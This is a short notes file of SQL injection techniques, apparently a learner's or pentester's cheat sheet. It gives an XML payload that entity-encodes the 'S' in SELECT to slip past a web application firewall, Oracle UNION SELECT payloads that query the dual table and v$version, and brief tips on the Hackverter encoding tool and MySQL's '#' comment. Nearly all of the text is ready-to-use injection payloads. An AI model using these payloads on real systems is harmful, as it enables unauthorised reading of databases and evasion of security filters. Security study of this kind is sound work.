# New Findings

- Hidden tables
- Login Bypass

Obfuscate the "S" in select for XML SQLi to bypass WAF
```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
> Hackverter
 - Encodes/Decodes XML tags on the fly

#### Oracle
- Placeholder Table: DUAL
``'+UNION+SELECT+'abc','def'+FROM+dual--``
`'UNION+select+BANNER,+NULL+from+v$version--`
 
#### MySQL
- Alternative comment "#"